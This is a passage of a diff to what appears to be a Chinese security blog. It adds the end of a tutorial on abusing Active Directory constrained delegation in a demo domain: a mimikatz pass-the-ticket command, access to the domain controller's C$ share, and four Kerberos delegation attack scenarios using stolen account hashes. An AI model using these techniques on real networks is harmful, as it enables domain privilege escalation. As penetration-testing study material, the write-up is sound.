+<pre><code>kerberos::ptt TGS_administrator@demo.local@DEMO.LOCAL_cifs~OWA2010DC.demo.local@DEMO.LOCAL.kirbi
+</code></pre><p>注入票据后，访问域服务器C盘目录的权限<br><img src="/2018/01/13/利用域委派获取域某些权限/cfis2.png" alt="cfis2"></p>
+<pre><code>dir \\owa2010dc.demo.local\c$ ==&gt; ok
+</code></pre><p>(4个小时后TGT失效，需要重新认证。)</p>
+<p><a href="https://www.anquanke.com/post/id/92484" target="_blank" rel="noopener">https://www.anquanke.com/post/id/92484</a> 示例有四個，他演示的是示例1，這裏演示的是示例4</p>
+<pre><code>样例1：已知被设置约束性委派属性的服务账号的口令明文，则可以获取域管理权限
+样例2：已控制约束性委派服务账号所在的服务器
+    攻击者控制了服务器，与样例1类似。由于攻击者控制了服务器，可直接利用mimikatz从内存获取服务账号的TGT，所以可以省去tgt::ask步骤，直接从tgs:s4u步骤开始，后续和样例1相同。
+样例3：已获取配置了约束性委派的服务账号的口令NTLM
+    和样例1相同，样例1用明文口令生成NTLM，然后向域服务器申请获取服务账号的TGT。Kekeo提供了该功能，可直接从NTLM开始，向域服务器申请TGT。
+样例4：一个主机账号被设置了约束性委派，已获取该主机账号的口令NTLM
+    方法和样例1也是类似，只不过样例1中是服务账号，而本样例中是主机账号。测试结果截图分别如下，不再过多解释。测试可在任何域内主机中进行，不需要在主机账号所在的主机。
+</code></pre><p>參考：</p>
+<pre><code>https://www.anquanke.com/post/id/92484  (作者筆誤： &quot;由于sqlsvc被设置为非约束性委派&quot; 改成 &quot;由于sqlsvc被设置为约束性委派&quot; 已證明 )
+http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/
+http://powersploit.readthedocs.io/en/latest/
+https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
+</code></pre>
         
     
 
@@ -846,7 +868,7 @@ https://www.anquanke.com/post/id/92484 示例有四個，他演示的是示例1�
             </a>
             <ul class="dropdown-menu">
             <li>
-                <a class="sidebar_archives-link" href="/archives/2018/01/">一月 2018<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/12/">十二月 2017<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/11/">十一月 2017<span class="sidebar_archives-count">4</span></a>
+                <a class="sidebar_archives-link" href="/archives/2018/03/">三月 2018<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/01/">一月 2018<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/12/">十二月 2017<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/11/">十一月 2017<span class="sidebar_archives-count">4</span></a>
             </ul>
         </li>
         
@@ -864,7 +886,7 @@ https://www.anquanke.com/post/id/92484 示例有四個，他演示的是示例1�
             </a>
             <ul class="dropdown-menu">
                 <li>
-                <a class="sidebar_archives-link" href="/categories/其他/">其他<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/categories/技术相关/">技术相关<span class="sidebar_archives-count">7</span></a>
+                <a class="sidebar_archives-link" href="/categories/其他/">其他<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/categories/技术相关/">技术相关<span class="sidebar_archives-count">9</span></a>
             </ul>
         </li>
         
@@ -873,7 +895,7 @@ https://www.anquanke.com/post/id/92484 示例有四個，他演示的是示例1�
     <!-- Pages  -->
     
         <li>
-            <a href="/about.md" title="关于">
+            <a href="/about" title="关于">
                 
                     <i class="material-icons sidebar-material-icons">person</i>
                 
@@ -888,7 +910,7 @@ https://www.anquanke.com/post/id/92484 示例有四個，他演示的是示例1�
         <li>
             <a href="/archives">
                 文章总数
-                <span class="sidebar-badge">10</span>
+                <span class="sidebar-badge">12</span>
             </a>
         </li>
         
